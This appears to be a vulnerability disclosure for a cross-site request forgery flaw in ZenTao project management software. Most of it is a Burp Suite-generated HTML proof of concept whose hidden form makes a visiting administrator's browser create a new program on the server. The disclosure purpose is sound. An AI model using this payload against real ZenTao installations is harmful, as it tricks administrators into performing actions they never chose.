# Cross-site Request Forgery Attack (CSRF) in ZenTao

Impact：ZenTao project management software is an open source project management software. Its latest version (Enterprise Edition<=5.0.rc1, Professional Edition<=10.0.rc1, Open Source Edition<=15.0) has cross-site request forgery attacks. Users can construct scenarios to entice administrators to perform background operations without their knowledge.

## 1.poc

poc：
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://ip:8002/index.php?m=program&f=create" method="POST">
      <input type="hidden" name="parent" value="0" />
      <input type="hidden" name="name" value="1" />
      <input type="hidden" name="PM" value="admin" />
      <input type="hidden" name="budget" value="1" />
      <input type="hidden" name="budgetUnit" value="CNY" />
      <input type="hidden" name="begin" value="2021&#45;04&#45;21" />
      <input type="hidden" name="end" value="" />
      <input type="hidden" name="status" value="wait" />
      <input type="hidden" name="desc" value="1" />
      <input type="hidden" name="acl" value="private" />
      <input type="hidden" name="whitelist&#91;&#93;" value="" />
      <input type="hidden" name="whitelist&#91;&#93;" value="admin" />
      <input type="hidden" name="uid" value="607feb9b12a29" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


```
![img](2.png)
The administrator can trigger the corresponding operation after clicking
